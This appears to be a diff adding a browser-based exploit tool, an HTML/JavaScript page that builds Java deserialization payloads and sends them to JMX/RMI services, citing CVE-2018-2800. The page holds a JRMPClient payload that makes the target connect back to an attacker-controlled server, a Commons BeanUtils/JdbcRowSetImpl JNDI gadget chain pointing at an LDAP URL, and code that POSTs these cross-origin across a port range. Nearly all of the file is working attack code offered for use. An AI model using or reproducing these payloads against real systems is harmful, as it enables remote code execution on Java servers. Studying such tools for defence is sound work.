@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<script src="javaser.js" type="text/javascript" charset="utf-8"></script>
+<style type="text/css">
+.tabs {
+	position: relative;
+	min-height: 10em; /* This part sucks */
+	clear: both;
+	margin: 35px 0 25px;
+}
+
+.tab {
+	float: left;
+}
+
+.tab>label {
+	padding: 10px;
+	border: 1px solid;
+	margin-left: -1px;
+	position: relative;
+	left: 1px;
+	top: -29px;
+}
+
+.tab>[type=radio] {
+	display: none;
+}
+
+.content {
+	position: absolute;
+	top: -1px;
+	left: 0;
+	right: 0;
+	bottom: 0;
+	padding: 20px;
+	border: 1px solid;
+	opacity: 0;
+}
+
+.tabs .tab>[type=radio]:checked ~ label {
+	border-bottom: 1px solid;
+	background-color: white;
+	z-index: 2;
+}
+
+.tabs .tab>[type=radio]:checked ~ label ~ .content {
+	z-index: 1;
+	opacity: 1;
+}
+</style>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<body>
+	<script type="text/javascript">
+		function encode_dgc_dirty(args) {
+			// Dgc.dirty
+			return encode_call(0, 2, 1, 4139157901, 2347927107, args);
+		}
+
+		function encode_registry_lookup(args) {
+			// Registry.lookup
+			return encode_call(0, 0, 2, 1142246857, 3571858399, args);
+		}
+
+		function encode_call(objIdHigh, objIdLow, methodId, methodHashHigh,
+				methodHashLow, args) {
+			var bytes = [];
+			var dos = new DataOutput(bytes);
+			new Integer(1246907721).write(dos); // Magic == JRMI
+			new Short(2).write(dos); // Version - 2
+			new Byte(76).write(dos); // SingleOpProtocol
+			new Byte(80).write(dos); // Type = Call
+
+			// this is the Connection/MarshalOutputStream setup for JRMP/RMI
+			var oos = new ObjectOutput(dos, {
+				'protocol' : 1,
+				'annotateClass' : function(cl) {
+					this.writeObject(new Null()); // location
+				},
+
+				'annotateProxyClass' : function(cl) {
+					this.writeObject(new Null()); // location
+				}
+			});
+			oos.writeHeader();
+
+			new Long(objIdHigh, objIdLow).write(oos); // objId
+			new Integer(0).write(oos); // UID - unique
+			new Long(0, 0).write(oos); // UID - time
+			new Short(0).write(oos); // UID - count
+
+			new Integer(methodId).write(oos);
+			new Long(methodHashHigh, methodHashLow).write(oos);
+
+			for (var i = 0; i < args.length; i++) {
+				oos.writeObject(args[i]);
+			}
+
+			oos.flush();
+			return bytes;
+		}
+
+		function encode_object(obj) {
+			var bytes = [];
+			var dos = new DataOutput(bytes);
+			var oos = new ObjectOutput(dos, {});
+			oos.writeHeader();
+			oos.writeObject(obj);
+			oos.flush();
+			return bytes;
+		}
+
+		function encode_hex(bytes) {
+			var hex = "";
+			for (var i = 0; i < bytes.length; i++) {
+				var b = bytes[i].toString(16);
+				if (b.length == 1) {
+					b = "0" + b;
+				}
+
+				hex += b;
+
+			}
+			return hex;
+		}
+
+		// from http://www.webtoolkit.info/javascript-base64.html
+		// LICENSE WARNING: the original function is licensed CC BY 2.0 UK
+		var B64_chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+		function encode_b64(bytes) {
+			var output = "";
+			var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
+			var i = 0;
+			while (i < bytes.length) {
+				chr1 = bytes[i++];
+				chr2 = bytes[i++];
+				chr3 = bytes[i++];
+
+				enc1 = chr1 >> 2;
+				enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+				enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+				enc4 = chr3 & 63;
+
+				if (isNaN(chr2)) {
+					enc3 = enc4 = 64;
+				} else if (isNaN(chr3)) {
+					enc4 = 64;
+				}
+
+				output = output + B64_chrs.charAt(enc1) + B64_chrs.charAt(enc2)
+						+ B64_chrs.charAt(enc3) + B64_chrs.charAt(enc4);
+
+			}
+
+			return output;
+		}
+
+		function make_jrmp_client_payl(host, port) {
+			var objIdLow = Math.floor(Math.random() * 4294967295);
+			var objIdHigh = Math.floor(Math.random() * 4294967295);
+			return new Object(new ObjectStreamClass(
+					"sun.rmi.server.UnicastRef", 1922802161, 2643414530, [], {
+						'writeExternal' : function(out, obj) {
+							/*
+							  ((TCPEndpoint) ep).writeHostPortFormat(out);
+							 	out.writeUTF(host);
+								out.writeInt(port);
+							  id.write(out);
+							  	out.writeLong(objNum);
+							    out.writeInt(unique);
+							    out.writeLong(time);
+							    out.writeShort(count);
+							  out.writeBoolean(isResultStream);
+							 */
+							out.writeUTF(host); // host
+							new Integer(port).write(out); // port
+							new Long(objIdHigh, objIdLow).write(out); // objId
+							new Integer(0).write(out); // UID - unique
+							new Long(0, 0).write(out); // UID - time
+							new Short(0).write(out); // UID - count
+							new Boolean(false).write(out); // isResultStream
+						}
+					}))
+		}
+
+		function make_beanutils_jndi_payl(beanutils_jndi_url) {
+
+			var brs = new ObjectStreamClass('javax.sql.rowset.BaseRowSet',
+					1137778085, 1304605152, [ {
+						'name' : 'concurrency',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'escapeProcessing',
+						'typeCode' : 'Z'
+					}, {
+						'name' : 'fetchDir',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'fetchSize',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'isolation',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'maxFieldSize',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'maxRows',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'queryTimeout',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'readOnly',
+						'typeCode' : 'Z'
+					}, {
+						'name' : 'rowSetType',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'showDeleted',
+						'typeCode' : 'Z'
+					}, {
+						'name' : 'URL',
+						'typeString' : 'Ljava/lang/String;'
+					}, {
+						'name' : 'asciiStream',
+						'typeString' : 'Ljava/io/InputStream;'
+					}, {
+						'name' : 'binaryStream',
+						'typeString' : 'Ljava/io/InputStream;'
+					}, {
+						'name' : 'charStream',
+						'typeString' : 'Ljava/io/Reader;'
+					}, {
+						'name' : 'command',
+						'typeString' : 'Ljava/lang/String;'
+					}, {
+						'name' : 'dataSource',
+						'typeString' : 'Ljava/lang/String;'
+					}, {
+						'name' : 'listeners',
+						'typeString' : 'Ljava/util/Vector;'
+					}, {
+						'name' : 'map',
+						'typeString' : 'Ljava/util/Map;'
+					}, {
+						'name' : 'params',
+						'typeString' : 'Ljava/util/Hashtable;'
+					}, {
+						'name' : 'unicodeStream',
+						'typeString' : 'Ljava/io/InputStream;'
+					}, ], {});
+
+			var rs = new ObjectStreamClass('com.sun.rowset.JdbcRowSetImpl',
+					3458652191, 1232323077, [ {
+						'name' : 'conn',
+						'typeString' : 'Ljava/sql/Connection;'
+					}, {
+						'name' : 'iMatchColumns',
+						'typeString' : 'Ljava/util/Vector;'
+					}, {
+						'name' : 'ps',
+						'typeString' : 'Ljava/sql/PreparedStatement;'
+					}, {
+						'name' : 'resMD',
+						'typeString' : 'Ljava/sql/ResultSetMetaData;'
+					}, {
+						'name' : 'rowsMD',
+						'typeString' : 'Ljavax/sql/rowset/RowSetMetaDataImpl;'
+					}, {
+						'name' : 'rs',
+						'typeString' : 'Ljava/sql/ResultSet;'
+					}, {
+						'name' : 'strMatchColumns',
+						'typeString' : 'Ljava/util/Vector;'
+					}, ], {
+						'superClass' : brs
+					});
+
+			var bc = new ObjectStreamClass(
+					"org.apache.commons.beanutils.BeanComparator", 3819014378,
+					1931650120, [ {
+						'name' : 'comparator',
+						'typeString' : 'Ljava/util/Comparator;'
+					}, {
+						'name' : 'property',
+						'typeString' : 'Ljava/lang/String;'
+					} ], {});
+
+			var rc = new ObjectStreamClass(
+					"java.util.Collections$ReverseComparator", 1678019312,
+					1397639888, [], {});
+
+			var pq = new ObjectStreamClass("java.util.PriorityQueue",
+					2497327284, 4215243441, [ {
+						'name' : 'size',
+						'typeCode' : 'I'
+					}, {
+						'name' : 'comparator',
+						'typeString' : 'Ljava/util/Comparator;'
+					} ], {
+						'writeObject' : function(out, obj, desc) {
+
+							var elems = obj.values['elements'];
+							var len = elems ? elems.length : 0;
+							obj.values['size'] = new Integer(len);
+
+							out.defaultWriteObject(obj, desc);
+							new Integer(len).write(out);
+
+							for (var i = 0; i < len; i++) {
+								out.writeObject(elems[i]);
+							}
+						}
+					});
+
+			var rso = new Object(rs, {
+				'dataSource' : new String(beanutils_jndi_url)
+			});
+
+			return new Object(pq, {
+				"elements" : [ rso, rso ],
+				"comparator" : new Object(bc, {
+					'comparator' : new Object(rc, {}),
+					'property' : new String('databaseMetaData')
+				})
+			});
+		}
+
+		function send(host, port, payl) {
+			var oReq = new XMLHttpRequest();
+			var url = "http://" + host + ":" + port + "/";
+			console && console.log && console.log("Sending payload to " + url);
+			oReq.open("POST", url, true);
+			var arr = new ArrayBuffer(payl.length);
+			var byteArray = new Uint8Array(arr);
+			for (var i = 0; i < payl.length; ++i) {
+				byteArray[i] = payl[i];
+			}
+			oReq.send(arr);
+			return oReq;
+		}
+
+		function get_radio(name) {
+			var radios = document.getElementsByName(name);
+			for (var i = 0, length = radios.length; i < length; i++) {
+				if (radios[i].checked) {
+					return radios[i].value;
+				}
+			}
+		}
+
+		function make_payload(payl_type) {
+			if (payl_type == "jrmp_client") {
+				var jrmp_client_host = document
+						.getElementById('jrmp_client_host').value;
+				var jrmp_client_port = parseInt(document
+						.getElementById('jrmp_client_port').value, 10);
+				return make_jrmp_client_payl(jrmp_client_host, jrmp_client_port);
+			} else if (payl_type == "beanutils_jndi") {
+				var beanutils_jndi_url = document
+						.getElementById('beanutils_jndi_url').value;
+				return make_beanutils_jndi_payl(beanutils_jndi_url);
+			} else {
+				throw "Invalid payload";
+			}
+		}
+
+		function go_jmx() {
+			var host = document.getElementById('host').value;
+			var port_low = parseInt(document.getElementById('port_low').value,
+					10);
+			var port_high = parseInt(
+					document.getElementById('port_high').value, 10);
+
+			if (!port_high) {
+				port_high = port_low;
+			}
+
+			var rpc_target = get_radio("rpc_target");
+			var payl_type = get_radio("payload");
+
+			console.log("Payload is " + payl_type + " target service "
+					+ rpc_target);
+
+			args = [ make_payload(payl_type) ];
+
+			var payl;
+			if (rpc_target == "registry") {
+				payl = encode_registry_lookup(args);
+			} else if (rpc_target == "dgc") {
+				payl = encode_dgc_dirty(args);
+			} else {
+				throw "Invalid target";
+			}
+
+			next = function(host, port, payl) {
+				req = send(host, port, payl);
+				window.current_req = req;
+
+				req.addEventListener("error", function(ev) {
+					if (port >= port_high) {
+						return;
+					}
+
+					var np = port + 1;
+					document.getElementById("progress").value = 100
+							* (port - port_low) / (port_high - port_low);
+					next(host, np, payl);
+				});
+
+				req.addEventListener("abort", function(ev) {
+					console.log("Cancelled");
+					window.current_req = null;
+				});
+			}
+
+			next(host, port_low, payl);
+		}
+
+		var encoders = {
+			'raw' : {
+				'printable' : false,
+				'encode' : function(bytes) {
+					return bytes;
+				},
+				'blob' : function(bytes) {
+					var arr = new Uint8Array(bytes.length);
+					for (var i = 0; i < bytes.length; i++) {
+					    arr[i] = bytes[i];
+					}
+					return new Blob([arr], {
+						type : 'application/octet-stream'
+					});
+				}
+			},
+			'hex' : {
+				'printable' : true,
+				'encode' : encode_hex,
+				'blob' : function(data) {
+					return new Blob([data], {
+						type : 'text/plain'
+					});
+				}
+			},
+			'b64' : {
+				'printable' : true,
+				'encode' : encode_b64,
+				'blob' : function(data) {
+					return new Blob([data], {
+						type : 'text/plain'
+					});
+				}
+			}
+		}
+
+		function go_generate() {
+			var payl_type = get_radio("payload");
+			var payl_enc = get_radio("payload_encoding") || "raw";
+			console.log("Payload is " + payl_type + " encoding " + payl_enc);
+			var obj = make_payload(payl_type);
+			var bytes = encode_object(obj);
+
+			var codec = encoders[payl_enc];
+			var encoded = codec.encode(bytes);
+
+			var out = document.getElementById('output');
+			out.style.display = 'block';
+
+			document.getElementById('output_length').textContent = encoded.length;
+			document.getElementById('output_format').textContent = payl_enc;
+
+			if (codec.printable) {
+				document.getElementById('output_text').style.display = 'block';
+				document.getElementById('output_text').textContent = encoded;
+			} else {
+				document.getElementById('output_text').style.display = 'none';
+			}
+
+			out.blob = codec.blob(encoded);
+			out.filename = payl_type + "." + payl_enc;
+		}
+
+		// https://stackoverflow.com/a/30832210
+		function download() {
+			var out = document.getElementById('output');
+			var file = out.blob;
+			var filename = out.filename; 
+			if (window.navigator.msSaveOrOpenBlob) { // IE10+
+				window.navigator.msSaveOrOpenBlob(file, filename);
+			} else { // Others
+				var a = document.createElement("a"), url = URL
+						.createObjectURL(file);
+				a.href = url;
+				a.download = filename;
+				document.body.appendChild(a);
+				a.click();
+				setTimeout(function() {
+					document.body.removeChild(a);
+					window.URL.revokeObjectURL(url);
+				}, 0);
+			}
+		}
+
+		function go() {
+			var output = get_radio("output");
+
+			if (output == "rmi") {
+				go_jmx();
+			} else {
+				go_generate();
+			}
+		}
+
+		function cancel() {
+			var cur = window.current_req;
+			if (cur) {
+				cur.abort();
+			}
+		}
+	// -->
+	</script>
+	<form>
+		<fieldset>
+			<legend>Target</legend>
+			<div class="tabs">
+				<div class="tab">
+					<input type="radio" id="out_generate" name="output"
+						value="generate" checked="checked" /> <label for="out_generate">Generate</label>
+
+					<div class="content">
+						<div>
+							<input type="radio" id="payload_encoding_raw"
+								name="payload_encoding" value="raw" checked="checked" /> <label
+								for="payload_encoding_raw">Raw</label> <input type="radio"
+								id="payload_encoding_hex" name="payload_encoding" value="hex" />
+							<label for="payload_encoding_hex">Hex</label> <input type="radio"
+								id="payload_encoding_b64" name="payload_encoding" value="b64" />
+							<label for="payload_encoding_b64">Base64</label>
+						</div>
+					</div>
+				</div>
+				<div class="tab">
+					<input type="radio" id="out_rmi" name="output" value="rmi" /> <label
+						for="out_rmi">JMX/RMI</label>
+
+					<div class="content">
+						<p>CVE-2018-2800 - JMX/RMI offered a HTTP transport that does allows cross
+							origin requests.</p>
+
+						<label for="host">Host:</label> <input id="host" type="text"
+							value="localhost" /> <label for="port_low">Port:</label> <input
+							id="port_low" type="text" value="1099" /> <span id="range"
+							style="display: none;"> - <input id="port_high"
+							type="text" value="" /> <progress id="progress" value="0"
+								max="100"></progress>
+						</span>
+
+						<div>
+							<input type="radio" id="rpc_target_registry" name="rpc_target"
+								value="registry" checked="checked" /> <label
+								for="rpc_target_registry">Registry.lookup()</label> <input
+								type="radio" id="rpc_target_dgc" name="rpc_target" value="dgc" />
+							<label for="rpc_target_dgc">DGC.dirty()</label>
+						</div>
+					</div>
+				</div>
+			</div>
+
+		</fieldset>
+
+		<fieldset>
+			<legend>Payload</legend>
+			<div class="tabs">
+				<div class="tab">
+					<input type="radio" id="payl_jrmp_client" name="payload"
+						value="jrmp_client" checked="checked" /> <label
+						for="payl_jrmp_client">JRMPClient (reverse filter bypass)</label>
+
+					<div class="content">
+						<p>Trigger a connection back to an attacker controlled JRMP
+							server that delivers the final deserialization payload</p>
+						<label for="jrmp_client_host">Connect Host:</label> <input
+							id="jrmp_client_host" type="text" value="localhost" /> <label
+							for="jrmp_client_port">Port:</label> <input id="jrmp_client_port"
+							type="text" value="1099" />
+					</div>
+				</div>
+				<div class="tab">
+					<input type="radio" id="payl_beanutils" name="payload"
+						value="beanutils_jndi" /> <label for="payl_beanutils">Commons
+						Beanutils (JNDI)</label>
+
+					<div class="content">
+						<label for="beanutils_jndi_url">JNDI URI:</label> <input
+							id="beanutils_jndi_url" type="text"
+							value="ldap://localhost:1389/obj" />
+					</div>
+				</div>
+			</div>
+		</fieldset>
+
+		<input type="button" value="Go" onclick="go()" /> <input
+			type="button" value="Cancel" onclick="cancel()" />
+
+		<fieldset id="output" style="display: none; margin-top: 2em;">
+			<legend>Output</legend>
+
+			<div>
+				<span id="output_length">0</span> bytes encoded as <span
+					id="output_format"></span>.
+			</div>
+			
+			<input type="button" value="Download" onclick="download()" />
+			
+			<textarea style="width: 100%;" id="output_text"
+				style="display: none;" rows="10" cols="80"></textarea>
+		</fieldset>
+	</form>
+</body>
+</html>
